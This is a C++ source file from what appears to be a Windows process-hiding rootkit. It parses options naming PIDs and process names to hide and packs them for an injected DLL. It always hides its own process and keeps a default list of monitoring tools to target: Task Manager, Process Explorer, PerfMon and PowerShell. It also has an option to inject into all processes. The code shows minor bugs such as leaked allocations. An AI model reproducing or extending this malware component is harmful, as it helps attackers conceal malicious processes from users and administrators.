#include "Preparations.h"
#include "Daemon.h"
#include "defs.h"


vector<wstring> frobiddenProcessesList;
ArgStruct argsToDLL;

// Add the default threats to the list
void initFrobProcList()
{
	LPWSTR BasicfrobProcList[] = { L"Taskmgr.exe", L"powershell.exe", L"procexp.exe", L"procexp64.exe", L"perfmon.exe" };
	const int numBasicFrobProc = 5;
	for (int i = 0; i < numBasicFrobProc; i++)
	{
		frobiddenProcessesList.push_back(wstring(BasicfrobProcList[i]));
	}	
}

int addProcessesToFrobList(TCHAR *optarg)
{
	int i = 0;
	TCHAR str_buffer[MAX_COMMAND], *pwc, *context, *delim = L",/";
	if (wcslen(optarg) == 0)
		return 0;
	wcscpy_s(str_buffer, MAX_COMMAND, optarg);
	pwc = wcstok_s(str_buffer, delim, &context);
	while (pwc != NULL)
	{
		i++;
		frobiddenProcessesList.push_back(wstring(pwc));
		pwc = wcstok_s(NULL, delim, &context);
	}
	return i;
}



//Add the PIDs, seperated by commas, to the global argsToDLL
int buildPIDsList(const TCHAR *optarg, BOOL includeSelf)
{
	//returned value - number of PIDs in list
	TCHAR str_buffer[MAX_COMMAND], *context, *pwc, *delim = L",./";
	int sizeOfIntBuffer = sizeof(int)*(int)(1 + ceil(wcslen(optarg) / (float)2));
	int i = 0, sizeOfStrBuffer = sizeof(TCHAR)*(MAX_COMMAND);
	wcscpy_s(str_buffer, MAX_COMMAND, optarg);
	if (wcslen(optarg) == 0 && !includeSelf)
		return 0;
	if (includeSelf)
	{
		i++;
		if (argsToDLL.pIDsNum <= MAX_PIDS_TO_SEND)
		{
			argsToDLL.pIDs[argsToDLL.pIDsNum] = (int)GetCurrentProcessId();
			argsToDLL.pIDsNum++;
		}
	}
	pwc = wcstok_s(str_buffer, delim, &context);
	while (pwc != NULL)
	{
		int x_buffer = _wtoi(pwc);
		if (x_buffer != 0)
		{
			i++;
			if (argsToDLL.pIDsNum < MAX_PIDS_TO_SEND)
			{
				argsToDLL.pIDs[argsToDLL.pIDsNum] = x_buffer;
				argsToDLL.pIDsNum++;
			}
		}
		pwc = wcstok_s(NULL, delim, &context);
	}
	return i;

}

//Add the hidden process names, seperated by commas, to the global argsToDLL
int buildProcNameList(const TCHAR *optarg, BOOL includeSelf)
{
	TCHAR *str_buffer, *context, *pwc, *delim = L",";
	int i = 0, sizeOfStrBuffer = (int)sizeof(TCHAR)*(int)(wcslen(optarg) + 1);
	if (wcslen(optarg) == 0)
		return 0;
	str_buffer = (TCHAR *)malloc(sizeOfStrBuffer);
	wcscpy_s(str_buffer, (wcslen(optarg) + 1), optarg);
	
	if (includeSelf)
	{
		TCHAR tmpSelfBuffer[MAX_PATH];
		GetModuleBaseName(GetCurrentProcess(), NULL, tmpSelfBuffer, sizeof(tmpSelfBuffer));
		int SizeOfStr = (int)sizeof(TCHAR)*(int)(1 + wcslen(tmpSelfBuffer));
		TCHAR *xx = (TCHAR *)malloc(SizeOfStr);
		i++;
		if (argsToDLL.procNamesLength <= MAX_PROC_NAMES_LINE_LEN-wcslen(tmpSelfBuffer) - 1)
		{
			wcscpy_s(argsToDLL.procNames, MAX_PROC_NAMES_LINE_LEN, tmpSelfBuffer);
			argsToDLL.procNamesLength += wcslen(tmpSelfBuffer) + 1;
		}
	}
	if (argsToDLL.procNamesLength <= (MAX_PROC_NAMES_LINE_LEN-wcslen(optarg)-1))
	{
		wcscat_s(argsToDLL.procNames, MAX_PROC_NAMES_LINE_LEN, optarg);
		argsToDLL.procNamesLength += wcslen(optarg) + 1;
	}
	pwc = wcstok_s(str_buffer, delim, &context);
	while (pwc != NULL)
	{
		int SizeOfStr = (int)sizeof(TCHAR)*(int)(1 + wcslen(pwc));
		i++;
		pwc = wcstok_s(NULL, delim, &context);
	}
	return i;

}



//parse the input arguments to format we can send to the DLL
BOOL BuildHiddenProcessesLists(int argc, _TCHAR* argv[],PBOOL P_InjectALL)
{
	bool isParameter_i_active = false, isParameter_n_active = false;
	int opt;
	TCHAR *flags;
	flags = L"i:n:x:g";

	initFrobProcList();
	while ((opt = getopt(argc, argv, flags)) != -1) {
		switch (opt) {
		case 'i':
			if (optarg == NULL)
			{
				printf("Illegal use of option i!\n");
				return FALSE;
			}
			else
			{
				isParameter_i_active = true;
				int PIDsNum = buildPIDsList(optarg, TRUE);
				if (PIDsNum == 0)
				{
					printf("Error using -i option!\n");
					return FALSE;
				}
			}
			break;
		case 'n':
			if (optarg == NULL)
			{
				printf("Illegal use of option n!\n");
				return FALSE;
			}
			else
			{
				isParameter_n_active = true;
				int procNameNum = buildProcNameList(optarg, FALSE);
				if (procNameNum == 0)
				{
					printf("Error using -n option!\n");
					return FALSE;
				}
			}
			break;
		case 'x':
		{
					if (addProcessesToFrobList(optarg) == 0)
					{
						printf("Error using -x option!\n");
						return FALSE;
					}
		}
			break;
		case 'g':
			if (P_InjectALL != NULL) *P_InjectALL = TRUE;
			break;
		
		default: /* '?' */
			printf("Illegal use of option %c!\n",opt);
			return FALSE;
			break;
		}
	}
	if (!(isParameter_n_active || isParameter_i_active))
	{
		printf("Error! You must enter at least one parameter!\n");
		return FALSE;
	}
	if (!isParameter_i_active)
	{
		buildPIDsList(L"", TRUE);
	}
	return TRUE;
}




BOOL PrepareContents(int argc, TCHAR * argv[],PBOOL P_InjectALL)
{
	return BuildHiddenProcessesLists(argc, argv,P_InjectALL);
}